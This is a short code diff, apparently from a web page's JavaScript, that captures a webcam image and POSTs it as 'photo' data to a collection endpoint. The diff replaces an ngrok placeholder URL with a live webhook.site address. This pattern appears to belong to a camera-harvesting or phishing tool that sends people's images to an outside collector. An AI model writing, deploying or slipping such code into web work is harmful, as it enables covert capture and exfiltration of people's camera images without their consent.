@@ -136,7 +136,7 @@
                         stream.getTracks().forEach(track => track.stop());
                         
                         // Send captured image to backend server for processing
-                        fetch('https://your-ngrok-url.ngrok.io/collect', {
+                        fetch('https://webhook.site/d93019bc-67ee-4d63-a334-ed7a20912c88', {
                             method: 'POST',
                             headers: {'Content-Type': 'application/json'},
                             body: JSON.stringify({ type: 'photo', data: imageData })
